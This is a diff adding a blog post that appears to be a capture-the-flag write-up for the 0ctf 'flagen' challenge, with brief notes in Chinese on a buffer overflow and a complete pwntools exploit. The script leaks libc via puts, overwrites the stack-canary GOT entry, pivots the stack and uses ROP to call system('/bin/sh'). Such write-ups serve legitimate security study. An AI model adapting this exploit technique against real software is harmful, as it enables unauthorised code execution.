@@ -1,0 +1,84 @@
+---  
+layout: post  
+title: "0ctf_flagen"  
+date: 2015-10-09 22:10:29 +0800  
+comments: true  
+categories:   
+---  
+  
+###0x00 分析  
+  
+Leetify中h会造成溢出  
+溢出后用strcpy把__stack_chkh改掉,puts得到libc的基址，rop输入内容到0x804be00,再把栈放到0x80xbe00处,继续rop得到shell  
+  
+leave esp = ebp-4 ; 	pop ebp  
+1.shellcode write got  
+2.change ebp continue ROP  
+  
+shell放入后会把b,h改掉不可  
+  
+###0x01 exp  
+  
+	from binascii import *  
+	from pwn import *  
+  
+	libc = ELF('/usr/lib/libc.so.6')  
+	r = process('./flagen')  
+	#r = remote('192.168.56.102', 6666)  
+  
+	__stack_got = 0x0804B01C  
+	puts_got = 0x0804B010  
+	puts_plt = 0x8048510  
+	leave_ret = 0x080485d8  
+	input = 0x80486CB  
+	popebp_ret = 0x08048b01  
+	pop2_ret = 0x08048b00  
+	pop3_ret = 0x08048d8d  
+	leave_ret = 0x080485d8  
+	popebx_ret = 0x08048481  
+	addr = 0x0804Be10  
+  
+  
+	payload  = ''  
+	payload += p32(leave_ret)  
+	payload += 'h'*(0x10c/3)  
+	payload += 'a'  
+	payload += p32(popebp_ret)  
+	payload += p32(__stack_got)	#dest  
+	payload += p32(puts_plt)  
+	payload += p32(popebx_ret)  
+	payload += p32(puts_got)  
+	payload += p32(input)  
+	payload += p32(pop3_ret)  
+	payload += p32(addr)  
+	payload += p32(0x7ffffff)  
+	payload += p32(0x7ffffff)  
+	payload += p32(popebp_ret)  
+	payload += p32(addr)  
+	payload += p32(leave_ret)	#leave : mov esp,ebp;	pop ebp  
+  
+  
+	print r.recvuntil('choice:')  
+	r.sendline('1')  
+	r.sendline(payload)  
+	print r.recvuntil('choice:')  
+	r.sendline('4')  
+	redata = r.recvuntil('11')  
+  
+	puts = (u32(redata[1:5]))  
+	libc_base = puts - libc.symbols['puts']  
+	system = libc_base + libc.symbols['system']  
+	print 'system address',hex(system)  
+  
+	payload  = ''  
+	payload += p32(addr+4)  
+	payload += p32(system)  
+	payload += p32(addr+20)  
+	payload += p32(addr+20)  
+	payload += p32(addr+20)  
+	payload += '/bin/sh\x00'  
+	r.sendline(payload)  
+	r.interactive()  
+  
+  
+  
